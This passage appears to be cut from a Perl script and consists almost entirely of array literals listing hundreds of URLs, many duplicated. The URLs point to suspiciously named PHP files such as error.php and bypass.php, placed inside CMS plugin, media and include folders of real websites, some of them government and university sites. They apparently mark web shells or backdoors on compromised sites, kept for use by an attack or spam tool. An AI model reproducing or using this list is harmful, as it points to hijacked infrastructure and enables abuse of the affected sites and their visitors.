"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://www.starcom1.eu/skin/adminhtml/error.php",
"http://zlotohiszpanii.pl/skin/adminhtml/error.php",
"http://king-solarman.com/skin/adminhtml/base/error.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.karpet.cz/media/system/js/jquery.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://themansphere.com/wp-includes/error.php",
"http://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.thewigmall.com/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.addisyouth.org.et/components/com_mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://www.tcfa1.net/errors.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.deltadunariilive.ro/wp-content/errors.php",
"http://fisioleste.com.br/wp-admin/errors.php",
"http://resources.opth1jobs.com//modules/errors.php",
"http://www.propertydd4u.com//errors.php",
"http://www.skipperdean.com//media/errors.php",
"http://www.baskingshark.ie//media/errors.php",
"http://flirtbogota.co/web3//media/errors.php",
"http://gaysm.pl/media/errors.php",
"http://www.baliste-club.org//media/errors.php",
"http://tbilisi-portal.com//tmp/errors.php",
"http://store.setar.aw/errors.php",
"http://www.pokal-royal.de//js/errors.php",
"http://www.fiesta-del-sol.fr//errors.php",
"http://ethnikometopo.gr//tmp/errors.php",
"http://newlifebiblechurch.org//media/errors.php",
"http://www.cjbg.ma/errors.php",
"http://donghohanghieu.diemnhan.net//errors.php",
"http://inovatyonconsorcio.com.br/errors.php",
"http://www.toprace.co.uk/errors.php",
"http://pretty-talk.com//js/lib/errors.php",
"http://ifeed.co.kr//errors.php",
"http://abcofficemoveis.com.br/novo/media/errors.php",
"http://www.gramophoneshop.nl/webshop//skin/frontend/default/errors.php",
"http://prweb.com.sg/maimee/errors.php",
"http://bkd.bimakota.go.id//wp-admin/css/colors/blue/errors.php",
"http://www.siambeautyonline.com//errors.php",
"http://www.supon.tech//skin/adminhtml/default/default/images/moneybookers/errors.php",
"http://www.icomplementi.com/picture_library/errors.php",
"http://gaysm.pl/flash/modules/global/js/errors.php",
"http://www.chrontel.com/skin/adminhtml/default/default/lib/prototype/windows/themes/magento/.../errors.php",
"http://www.internetrights.in/wp-content/plugins/contact-form-7/images/service-icons/errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://mrsteamers.com//wp-content/plugins/errors.php",
"http://onlineordering.alumaxshowerdoor.com/skin/frontend/errors.php",
"http://www.chispazorumbas.com//plugins/errors.php",
"http://projects.kurinjiemedia.com/singlemovie//wp-content/plugins/errors.php",
"http://pasionporlajusticia.com/2015//wp-content/plugins/errors.php",
"http://www.younik.co/skin/frontend/errors.php",
"http://www.fedir.it//components/com_mailto/views/mailto/errors.php",
"http://www.copati.org.br//images/jdownloads/screenshots/thumbnails/errors.php",
"http://tuva-church.com/slovo//wp-content/plugins/dzs-videogallery/errors.php",
"http://morada.com.ve/newsite//wp-content/plugins/dzs-videogallery/errors.php",
"http://cmtactical.com//skin/install/default/default/errors.php",
"http://oldfashionedman.com//errors.php",
"http://ajansfestival.com/wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://tricotrico.com/wp-includes/error.php",
"http://www.shg-vaskulitis-eifel-mosel.de//forum/style/portal/error.php",
"http://nutritie-wellness.ro/var/package/tmp/error.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://themansphere.com/wp-includes/error.php",
"https://www.cloudipalarm.nl/wp-content/plugins/revslider/temp/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://www.lupetticonsultoria.com.br//kellylupetti/errors.php",
"http://redzee.com.au/friends/errors.php",
"http://watchmanreports.com/errors.php",
"http://www.chispazorumbas.com//hwdvideos/errors.php",
"http://islamone.org/errors.php",
"http://hoopsnhiphop.com/errors.php",
"http://www.brasilecon.net/skin/errors.php",
"http://redzee.com.au/friends/inc/classes/errors.php",
"http://shoppershopee.com/errors.php",
"http://xoxofimp.com//errors.php",
"http://islamone.org/flash/errors.php",
"http://www.lmcreativedesign.com.br/wp-content/plugins/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.thermona-ekb.ru/errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://www.jhanjhatfree.com//skin/frontend/base/errors.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://therfw.com/wp-includes/error.php",
"http://representacoesdasa.com.br/wp-admin/errors.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.telsonet.pl/errors.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://pastorbonus.sk/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://www.imakecollege.com:37001//plugins/editors/errors.php",
"http://imotionasia.com.vn/errors.php",
"http://www.theatresprives.com/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://moreketing.mx/errors.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.psdf.org.pk/errors.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://circuitec.com.br/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.musetti.eu/errors.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.thewigmall.com/errors.php",
"https://www.aavamobile.com/modules/mod_search/index.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.cannell-immobilier.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://sufbellman.dk//errors.php",
"http://printfastt.com.br/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://blizzsozz.com/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://www.mirabalcenter.org//errors.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://hoponhopoff.ge//errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://kenthecomicman.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"http://sumaho-print.net//bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://laptopcity.co.nz/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://ivanous.free.fr/camu_s_world/images/stories/jump.php",
"http://www.pessebristassumpcio.com/wp-includes/error.php",
"http://www.kittfoundation.org//wp-includes/js/plupload/index.php",
"http://www.pricepaving.com//wp-includes/js/plupload/index.php",
"http://www.travelpointer.ro//wp-includes/js/plupload/index.php",
"http://www.zsp.karpacz.pl//libraries/joomla/document/index.php",
"http://www.studio-aid.it//libraries/joomla/database/index.php",
"http://www.corteganamedieval.com/components/com_content/views/section/tmpl/page-sidebar.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.orfej.si/components/com_mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.dileeponline.com/errors.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://hi.ctust.edu.tw/medicalcontest//components/com_mailto/error.php",
"http://p.istu.ru//components/com_mailto/error.php",
"http://www.telsonet.pl/errors.php",
"http://turkishonline.ru//media/system/js/error.php",
"http://vdfs.ru//plugins/editors/error.php",
"http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php",
"http://www.cchm.ca/components/com_mailto/error.php",
"http://www.ele-eme.com.mx/error.php",
"http://virtualmacompetition.com//error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://www.bortolotto.eu/plugins/editors/error.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://www.photodesign.uncanny.cz/images/error.php",
"http://chaoscollective.in/administrator/components/com_weblinks/views/errors.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.sbagro.org.br/modules/mod_login/error.php",
"http://deangelisviaggi.it//wp-admin/network/error.php",
"http://www.elado.ro//xmlrpc/error.php",
"http://www.oem-dealer-parts.ca//components/com_media/error.php",
"http://blog.eurostargym.com/wp-includes/js/thickbox/class-mail.php",
"http://shop.stroiportal.kz/cgi-bin/error.php",
"http://www.mecanica.ufrj.br/ufrj-em//components/error.php",
"http://www.t1site.com.br/wp-admin/error.php",
"http://quadrabrain.com//wp-admin/error.php",
"http://milesnation.com/whitney/css/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.gardenmachinery.ie/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://rothwellscouts.com/media/mailto/error.php",
"http://www.ehbo-eelde.nl/media/error.php",
"http://www.cocofashion.com.au/errors.php",
"http://www.alexgretter.com/google.php",
"http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php",
"http://www.modelismonaval.com/components/com_user/class-mail.php",
"http://www.thewigmall.com/errors.php",
"http://www.solucionesparati.net/CMS2008/images/error.php",
"http://www.allcam.org/errors.php",
"http://totalfish.hu/errors.php",
"http://circuitec.com.br/errors.php",
"http://www.theatresprives.com/errors.php",
"http://wesotech.com/contact/google.php",
"http://moreketing.mx/errors.php",
"http://sufbellman.dk/media/error.php",
"http://www.mariobabiera.com/google.php",
"http://jhealthy.com/jhome//wp-admin/error.php",
"http://virtual-aerospace.co.jp/errors.php",
"http://www.studiogross.com.br/web/wp-includes/error.php",
"http://pastorbonus.sk/errors.php",
"http://test.stramed.com.tr/errors.php",
"http://metroway.com/wp-includes/ID3/proxy.php",
"http://www.psdf.org.pk/errors.php",
"http://iheld.com/errors.php",
"http://bohealth.eu/media/com_jantivirus/css/index.php",
"http://www.musetti.eu/errors.php",
"http://pngk.kz/media/media/css/index.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://www.lincos.si/components/com_banners/models/error.php",
"http://eventos.unisangil.edu.co/media/media/css/index.php",
"http://www.shturmovoi.ru/components/com_mailto/error.php",
"http://www.kawaiishop.fr/var/pass/search.php",
"http://lisarkent.com/errors.php",
"http://savvyschools.ie/wp-includes/images/pass/script-loader.php",
"http://www.bespoke-valeting.co.uk/wp-includes/error.php",
"http://www.tkofschip.be/joomlasites/ankerintranet5/plugins/content/config.index.php",
"http://blizzsozz.com/errors.php",
"http://www.conradel.com/errors.php",
"http://www.jaguarcarclubofwa.com.au/jaguarcarclubofwa/images/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://kavkazinterpress.ru/plugins/content/config.inc.php",
"http://www.dom-sad-ogorod.ru/plugins/search/config.inc.php",
"http://www.pkstorages.com//plugins/content/seka.php",
"http://www.3freebids.com/error.php",
"http://www.rateavon.je/error.php",
"http://dateakademie.de/wp-includes/error.php",
"http://www.cannell-immobilier.com/errors.php",
"http://themansphere.com/wp-includes/error.php",
"http://hoponhopoff.ge/errors.php",
"http://directproducts.co.zw/errors.php",
"http://www.acdt-manutention.fr/errors.php",
"http://www.semneartemis.ro/images/errors.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://www.thermona-ekb.ru/errors.php", 
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://mozaika-mira.ru//media/system/js/error.php",
"http://www.asesoriaentesis.com/components/com_mailto/error.php",
"http://www.pebk.de/joomla/components/com_mailto/error.php",
"http://www.atopsuccess.com//plugins/editors/error.php",
"http://islamone.org/flash/errors.php",
"http://pnpdistribuidora.com.br//erros/errors.php",
"http://ancoimbra.net//media/errors.php",
"http://heb.smart-test.co.il/errors.php",
"http://www.thomastyreperu.com//plugins/errors.php",
"http://soosh-lb.com//errors.php",
"http://eshopbmw.com//skin/adminhtml/default/error.php",
"http://www.mecanica.coppe.ufrj.br/ufrj-em//components/com_media/error.php",
"http://www.iwhatswatch.com//skin/frontend/default/default/images/error.php",
"http://www.imc-egypt.org//cli/error.php",
"http://www.thermona-ekb.ru/errors.php",
"http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://www.yplittleport.org.uk/media/system/config.index.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://australiansuperaudit.com.au/errors.php",
"http://www.angola-embassy.nl/errors.php",
"http://www.pece.com.my/2014/wp-content/themes/Avada/framework/error.php",
"http://www.ares-asesores.com/ares/wp-content/languages/error.php",
"http://kontento.eu/wp-content/themes/smartbox-theme/error.php",
"http://arpwegenwaterbouw.nl/wp-content/themes/smartbox-theme/error.php",
"http://vatnedekkservice.no/wp-includes/js/thickbox/class-mail.php",
"http://valentealexvalente.com/alex/wp-includes/error.php",
"http://pnpdistribuidora.com.br//errors.php",
"http://clinicavanity.com.br/2012/wp-includes/error.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"https://unique-sportstime.de/shop/skin/install/default/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb/error.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
"http://www.chemistlanes.com/bypass.php",
"http://zend.secl.com.ua/media/bypass.php",
"http://www.vonora.net/bypass.php",
"http://www.motisa.com/bypass.php",
"https://gpscsomagok.hu/skin/bypass.php",
"http://www.studiofifteen.in/errors.php",
"http://daddivamoda.com.br/bypass.php",
"http://hoponhopoff.ge//errors.php",
"http://www.mirabalcenter.org//errors.php",
"http://virtual-aerospace.co.jp//errors.php",
"http://www.flowershop-neo.com/wp-includes/error.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://celticdesire.com//components/com_admintools.backup.8125814a31f9f71dc788a351c9ffb5d8/class-mail.php"
);

my @random5  = ("www.beslistfietsen.nl/errors.php",
"citizenofburma.org//plugins/content/errors.php",
"http://choir.louwanjpoujezi.org//plugins/content/errors.php",
"http://gdthuyphuong.free.fr//includes/errors.php",
"http://cnsave.koray.cn/errors.php",
"http://www.masterlocksleutelkluis.nl/errors.php",
"http://ecom.wilburhuang.com/errors.php",
"http://demo.ecommerce.facto.cl/magento/1.9/skin/errors.php",
"http://zamzamsweets.in/errors.php",
"http://centralcaixas.com/mdf/errors.php",
"http://www.bazardakau.com.br/errors.php",
"http://shardha.in/errors.php",
"http://www.sapphireengagement.co.uk/errors.php",
"http://www.dvdmall.us/errors.php",
"http://sifide.gob.mx/errors.php",
"http://www.dibbs.co.za/errors.php",
"http://www.shop.mitrapai.com/skin/errors.php",
"http://www.rotarymowers.com.au/errors.php",
"http://printi.be/errors.php",
"http://dev2.etwebsolutions.com/magento/test/1901/errors.php",
"http://khhalisi.com/media/errors.php",
"http://petbox.in//media/errors.php",
"http://orcastudio.co/blog/errors.php",
"http://www.thermona-ekb.ru/errors.php",
"http://www.bendit.co/backside/media/mailto/error.php",
"http://imotionasia.com.vn/errors.php",
"http://www.austriasport.nl/wp-includes/errors.php",
"http://www.gambinigroup.it/media/mailto/error.php",
"http://therfw.com/wp-includes/error.php",
"http://greenpowerguy.com/blog/wp-content/themes/error.php",
"http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php",
"http://www.anz.udo.edu.ve/components/com_mailto/error.php",
"http://bioenfapesp.org/media/mailto/error.php",
"http://cccjamaica.org/cccj_main/media/mailto/error.php",
"http://www.fcors.com.br/modules/mod_banners/error.php",
"http://automarket-fortuna.ru/errors.php",
"http://www.cloudipalarm.nl//wp-admin/user/error.php",
"http://box-creative.com/bx//wp-includes/js/swfupload//error.php",
"http://www.sumkimig.ru//phpthumb///error.php",
"http://www.decorvega.es/bypass.php",
"http://belvg.info/demo/magento/framershop/skin/frontend/default/error.php",
"http://re-bel.org//bypass.php",
"http://tsat-dashboard.com/videocache/bypass.php",
"http://newtec.vn//bypass.php",
"http://friendsofradstockrailwayland.org/upload/bypass.php",
"http://139.59.69.212/bypass.php",
"http://sweetfeel.sigmacell.in/bypass.php",
"http://www.prikabylove.com/downloader/bypass.php",
"http://3dproducts.com.ec/bypass.php",
"http://techno.pk/skin/bypass.php",
"http://www.heliboss.com.mx//skin/bypass.php",
